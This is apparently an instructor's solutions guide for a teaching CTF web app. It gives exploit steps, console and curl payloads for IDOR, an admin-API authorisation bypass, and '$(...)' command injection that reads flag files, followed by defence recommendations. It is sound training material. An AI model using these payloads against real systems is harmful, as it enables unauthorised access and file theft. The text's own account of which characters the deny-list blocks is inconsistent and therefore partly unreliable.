# CTF 8 -- Solutions


---

## Credentials

See `src/data/users.json` for all usernames and passwords. The three seeded player accounts are `abcd12`, `efgh34`, and `ijkl56`. Player passwords are random hex strings (re-rolled each time `chgen_ctf8.js` runs). Staff accounts (`sarah.lin`, `tom.ashworth`, `priya.kapoor`, `marcus.webb`) carry the literal password `SYSTEM_INTERNAL` and cannot authenticate.

To regenerate:
```bash
cd CTFs/challenge-generation
node chgen_ctf8.js abcd12 efgh34 ijkl56
```

---

## Flag Locations

| Flag | Location | Delivered via |
|------|----------|---------------|
| 1 | `src/data/flags.json` (server-side substitution into article 3) | IDOR on `/api/articles/:id` |
| 2 | `src/data/flags.json` (embedded in admin dashboard JSON response) | Direct API call to `/api/admin/dashboard` |
| 3 | `src/data/flag-files/flag3-<user>.txt` (copied to `/app/flags/` at startup) | Command substitution inside ping argument |

Flag format: `durham-gzflag{1,2,3}{<16-hex-token>_<username>}`

Example for `abcd12`:
- Flag 1: `durham-gzflag1{15d4f4c31e2c8c80_abcd12}`
- Flag 2: `durham-gzflag2{2185b7f06f9c6295_abcd12}`
- Flag 3: `durham-gzflag3{73bfbc5faeb3159e_abcd12}`

---

## Vulnerability Summary

### Flag 1 -- IDOR (`GET /api/articles/:id`)

The article API looks up articles by integer ID with no check that the requesting user is the author. IDs are sequential starting from 1; the archive page lists published pieces and the caller's own pieces, so the gaps in the listing (`#3`, `#8`) are a visible breadcrumb that foreign drafts exist. The server renders `{{PLAYER_FLAG1}}` into the article body at response time using the viewer's username, so each player retrieves their own personal flag.

### Flag 2 -- Missing Server-Side Authorisation (`/api/admin/dashboard`)

The `/admin` HTML page ships `static/js/admin.js`, which calls `/api/me`, reads the role, and redirects non-admins to `/dashboard?error=admin_required`. This is a client-side control. The server-side handler `AdminDeps.APIDashboard` applies only `RequireSession` middleware -- any authenticated session receives the response, which includes the player's flag2 and the full user directory (revealing `marcus.webb` and the maintenance tools list).

### Flag 3 -- Command Injection via Substitution Bypass (`POST /api/admin/health`)

The "Network Diagnostics" tool runs:

```go
cmd := exec.CommandContext(ctx, "sh", "-c", fmt.Sprintf("ping -c 1 -W 2 %s", host))
```

The host field is filtered with a naive deny-list of `;`, `|`, `&`, `\n`, `\r`. None of `$`, `(`, `)`, or backtick are blocked, so `$(cmd)` command substitution is reachable. The payload `$(cat /app/flags/flag3-<user>.txt)` expands before ping runs: the single-token flag is spliced as ping's hostname argument, and because the token isn't resolvable, ping errors with `ping: <flag>: Name does not resolve`, echoing the flag verbatim into `stdout/stderr` which the handler returns to the client.

---

## Full Exploit Walkthrough

### Step 0: Start the application and log in

Start the challenge (instructor step -- you may already have this running):

```bash
cd CTFs/challenge-generation && node chgen_ctf8.js abcd12 efgh34 ijkl56
cd ../CTF_8_gazette && docker compose up --build
```

Open http://localhost:3002 in a browser and log in as `abcd12`. The generator prints the password to the terminal; it's also readable in `src/data/users.json`.

Most of this walkthrough runs in the browser -- DevTools Network tab and the browser console are enough to get all three flags. If you prefer the command line, you can copy your session cookie after logging in:

1. Open DevTools (F12) -> **Application** (Chrome) or **Storage** (Firefox) -> **Cookies** -> `http://localhost:3002`.
2. Copy the value of the cookie named `pressroom_session`.
3. Use it with curl via the `Cookie` header:

```bash
SESSION="paste-the-pressroom_session-value-here"
curl -sS -H "Cookie: pressroom_session=$SESSION" http://localhost:3002/api/me
# => {"username":"abcd12","role":"contributor","display_name":"abcd12"}
```

If any call returns `{"error":"authentication required"}`, your cookie has expired or you forgot the `Cookie` header -- log in again and re-copy the value.

---

### Step 1: Flag 1 via IDOR

The login page carries a dev handover note: *"Marcus left the archive APIs in an intermediate migration state. Ownership enforcement landed on the frontend only; the server-side audit is still pending."* That's your class hint -- something on the archive side is filtered on the client, not the server.

After sign-in the dashboard shows a single piece filed under your byline: an onboarding draft at `#10` titled *"Welcome to PressRoom -- file your first piece"*. Click it. The URL bar shows `/articles/10`, and if you open **DevTools -> Network** and reload, you can see the browser hit `/api/articles/10` and receive the same article as JSON. That tells you two things:

- `/articles/<id>` and `/api/articles/<id>` are the same piece, one rendered as HTML and one as JSON.
- IDs are integers.

Now click **Archive** in the top nav. The listing is a table ordered by ID: `#1`, `#2`, `#4`, `#5`, `#6`, `#7`, `#9`, `#10`. Note the gaps -- `#3` and `#8` are missing. Every article with `status: published` is listed, plus your own pieces (`#10`). The missing IDs must be drafts filed by someone else. The login notice promised the ownership check lives on the frontend only, so try the API directly:

**In the browser:** visit `http://localhost:3002/articles/3` directly.

**In the browser console:**

```js
fetch('/api/articles/3').then(r => r.json()).then(console.log)
```

**Or with curl (using the `$SESSION` cookie value from Step 0):**

```bash
curl -sS -H "Cookie: pressroom_session=$SESSION" http://localhost:3002/api/articles/3
```

**The response body contains:**

```
DRAFT: The tips that won't stop coming
... the confidential marker for this draft is: durham-gzflag1{15d4f4c31e2c8c80_abcd12} ...
```

Article 3 is Sarah Lin's draft (author id 1), but you fetched it as contributor `abcd12` with no ownership check. Each player who runs the same request gets their OWN flag1 because the server substitutes the `{{PLAYER_FLAG1}}` placeholder using the session's username.

The draft body also breadcrumbs Flag 2: *"I have asked Marcus's replacement to lock down the admin panel at /admin, but I suspect the API endpoints are still wide open."*

---

### Step 2: Flag 2 via Missing Server-Side Auth

Visit `http://localhost:3002/admin` in the browser. The page briefly flashes, then the browser bounces you back to `/dashboard?error=admin_required`. That's a client-side redirect -- the server was happy to serve the page.

Open DevTools -> **Network** tab -> reload `/admin`. You'll see `/api/me` (returns `role: "contributor"`) and the redirect triggered by `static/js/admin.js`:

```js
const me = await (await fetch('/api/me')).json();
if (me.role !== 'admin') { window.location = '/dashboard?error=admin_required'; return; }
const data = await (await fetch('/api/admin/dashboard')).json();
```

The redirect is JavaScript, not a server response. Call the admin API directly:

**In the browser console:**

```js
fetch('/api/admin/dashboard').then(r => r.json()).then(console.log)
```

**Or with curl:**

```bash
curl -sS -H "Cookie: pressroom_session=$SESSION" http://localhost:3002/api/admin/dashboard
```

The response contains:

- `flag`: `durham-gzflag2{...}` -- your Flag 2.
- `maintenance_tools[]` including Marcus Webb's "Network Diagnostics" entry pointing at `/api/admin/health` with an example body `{"host": "example.com"}`.
- The full user directory including `marcus.webb` (active=false), confirming the redundancy narrative.

The `maintenance_tools` entry is the breadcrumb to Flag 3.

---

### Step 3: Flag 3 via Command Substitution

From the Flag 2 response you know the endpoint: `POST /api/admin/health` with a JSON body `{"host": "..."}`. First probe it with a normal host and an obvious injection.

**In the browser console:**

```js
// baseline ping
fetch('/api/admin/health', {
  method: 'POST',
  headers: {'Content-Type':'application/json'},
  body: JSON.stringify({host:'127.0.0.1'})
}).then(r => r.json()).then(console.log)

// naive injection
fetch('/api/admin/health', {
  method: 'POST',
  headers: {'Content-Type':'application/json'},
  body: JSON.stringify({host:'127.0.0.1;ls'})
}).then(r => r.json()).then(console.log)
// => 400 {"error":"Invalid host: forbidden characters detected"}
```

**Or with curl:**

```bash
curl -sS -H "Cookie: pressroom_session=$SESSION" \
     -H "Content-Type: application/json" \
     -X POST http://localhost:3002/api/admin/health \
     -d '{"host":"127.0.0.1;ls"}'
# => 400 {"error":"Invalid host: forbidden characters detected"}
```

The block list (visible in `internal/services/health.go` if you have the source) is `;`, `|`, `&`, `\n`, `\r`. None of `$`, `(`, `)`, or backtick are blocked, so command substitution `$(...)` goes straight through.

**Confirm the bypass:**

```bash
curl -sS -H "Cookie: pressroom_session=$SESSION" \
     -H "Content-Type: application/json" \
     -X POST http://localhost:3002/api/admin/health \
     -d '{"host":"$(echo pressroom_bypass_marker)"}'
# => "output": "ping: pressroom_bypass_marker: Name does not resolve\n"
```

Ping tried to resolve the shell's output as a hostname and echoed it back in the error. Now read the flag file:

```bash
curl -sS -H "Cookie: pressroom_session=$SESSION" \
     -H "Content-Type: application/json" \
     -X POST http://localhost:3002/api/admin/health \
     -d '{"host":"$(cat /app/flags/flag3-abcd12.txt)"}'
```

**Response:**

```json
{
  "host": "$(cat /app/flags/flag3-abcd12.txt)",
  "output": "ping: durham-gzflag3{73bfbc5faeb3159e_abcd12}: Name does not resolve\n",
  "error": "exit status 2"
}
```

The flag is echoed directly in ping's error output.

**Finding the path:** the filename pattern `flag3-<username>.txt` is guessable from the staff convention in article 2 (where Sarah references "flag files"). The path `/app/flags/` is the `FLAGS_DIR` environment variable set in the Dockerfile and exposed in the admin dashboard's `system.notes` breadcrumb. A player can also enumerate: `$(ls /app/flags)` returns the directory listing which is spliced as ping's first argument.

---

## One-liner Verification (Instructor / Marker)

This is an automated pass for instructors verifying the chain without going through the browser. It reads the password from `src/data/users.json`, logs in, and runs each exploit in turn. Run from the repo root.

```bash
PASS=$(grep -A1 '"abcd12"' CTFs/CTF_8_gazette/src/data/users.json | grep password | awk -F'"' '{print $4}')
COOKIE=$(mktemp)
curl -sS -c $COOKIE -X POST http://localhost:3002/login -d "username=abcd12&password=$PASS" -o /dev/null --max-redirs 0

echo "Flag 1:"
curl -sS -b $COOKIE http://localhost:3002/api/articles/3 | grep -oE 'durham-gzflag1\{[^}]+\}'

echo "Flag 2:"
curl -sS -b $COOKIE http://localhost:3002/api/admin/dashboard | grep -oE 'durham-gzflag2\{[^}]+\}'

echo "Flag 3:"
curl -sS -b $COOKIE -X POST http://localhost:3002/api/admin/health \
  -H "Content-Type: application/json" \
  -d '{"host":"$(cat /app/flags/flag3-abcd12.txt)"}' | grep -oE 'durham-gzflag3\{[^}]+\}'
```

---

## Post-Design Audit

> The `## Vulnerability Summary` section near the top of this document satisfies the audit's first required subsection; it is referenced rather than duplicated.

### Unintended Solutions to Watch For

- **Cross-user flag read via path manipulation.** The Flag 3 payload specifies the flag file path explicitly. A player could read another player's flag by changing the username in the path (`$(cat /app/flags/flag3-efgh34.txt)`). This is accepted as a documented CTF limitation; each player must still craft the substitution payload to succeed, so the learning objective is preserved.
- **Users.json via path traversal.** The flag-3 payload is `$(cat ...)` with arbitrary file reads inside the container. A determined player could read `/app/src/data/users.json` and harvest other players' bcrypt hashes. The hashes are salted bcrypt, so this is a theoretical risk only; it doesn't shortcut any flag.
- **Browsing `/admin` without bypassing JS.** A player with JavaScript disabled will see the empty admin shell and stop. This is not a valid flag path -- the expected route is via `curl` / DevTools Network tab.
- **Brute-force login.** Rate limited to 5 attempts per 2-minute sliding window per IP by `middleware.NewLoginRateLimiter`.

### Defence Recommendations

1. **Enforce server-side ownership on `/api/articles/:id`.** Before returning an article, check `article.author_id == session.user_id` or check an explicit share list. Client-side filtering is not access control.
2. **Enforce server-side role checks on every `/api/admin/*` route.** Add a `RequireRole("admin")` middleware and apply it to the admin route group. The client-side redirect in `admin.js` is a UX hint, not a security boundary.
3. **Replace the command-injection-prone ping shellout.** Either call a pure-Go ICMP library (requires `CAP_NET_RAW`), or `exec.Command("ping", "-c", "1", "-W", "2", host)` directly without `sh -c`, and validate `host` against a strict allow-list (RFC 1123 hostname or a parsed `net.IP`).
4. **Stop using deny-lists for input validation.** Deny-lists are brittle; allow-lists are safer. For `host`, enforce `^[a-zA-Z0-9.-]+$` with a length cap, and ensure the total doesn't start with `-` (another ping footgun).
5. **Use non-sequential article IDs.** UUIDs or ULIDs make enumeration harder, but they do not fix the underlying access-control bug.
6. **Drop the binary's permission surface.** Run the container as a non-root user; strip `CAP_NET_RAW` if ICMP is unavailable anyway.

### OWASP Classification

| Technique | OWASP Category | Justification |
|-----------|----------------|---------------|
| IDOR on sequential article IDs | A01:2021 Broken Access Control | Missing ownership check lets any authenticated user read any article |
| Missing server-side authorisation on admin API | A01:2021 Broken Access Control | Role check performed only on the client, server trusts any valid session |
| OS command injection via `$(...)` bypass | A03:2021 Injection | Unvalidated user input interpolated into `sh -c` with an incomplete deny-list |

### Skill Level & Realism Notes

| Step | What the student does | Skill required |
|------|-----------------------|----------------|
| 1 | Log in, read dashboard breadcrumbs | Beginner |
| 2 | Enumerate `/api/articles/<n>` for foreign IDs | Beginner |
| 3 | Realise admin-panel redirect is client-side only; replay `/api/admin/dashboard` via curl or DevTools | Intermediate |
| 4 | Read the admin maintenance_tools hint pointing at `/api/admin/health` | Beginner |
| 5 | Discover the blocklist via trial and construct a `$(...)` bypass | Intermediate |
| 6 | Locate the flag file path (`/app/flags/flag3-<user>.txt`) and craft the `cat` payload | Intermediate |

Real-world analogue: Capital One's 2019 SSRF + IAM compromise (broken-access-control of metadata) shares the IDOR pattern; the `$(...)` substitution-bypass class is identical to the Bash CVE-2014-6271 (Shellshock) variant family on web shellouts. The IDOR + admin client-only-check combination matches dozens of bug-bounty disclosures (e.g. Uber 2016 GET-based account takeover surfaces).

### Lessons Learned (Design Retrospective)

- **The Go integration test (`test/integration_test.go`) was the project's first real integration suite.** Building it surfaced the per-test sqlite-file pattern that the rest of the workflow now standardises on (see `CTFs/TESTING_RUBRIC.md` §2.2). Keep the test data isolated; never share a single sqlite path across goroutines.
- **The blocklist was tightened mid-development.** Initial drafts allowed backticks; we removed those after testing showed players bypassing the deny-list with `` `cat ...` `` rather than the intended `$(...)`. The current deny-list is intentionally narrow (no backticks, no `;`, no `&`, no `|`) so `$(...)` is the path that works; preserve this footprint when revisiting.
- **Sequential article IDs were a deliberate teaching choice.** Switching to UUIDs would obscure the IDOR primitive; the production fix is documented in defence rec #1 above and kept distinct from the teaching primitive.
- **Next time:** ship a `--seed-flags-from-env` mode so the e2e harness can re-key flags between runs without rebuilding the container; current rebuild adds ~30s per CI cycle.

---

## Reset

```bash
docker compose down && docker compose up --build
```

This destroys the container and rebuilds. Flag files are baked into the image at build time and also mounted read-only, so there is no persistent state to wipe.
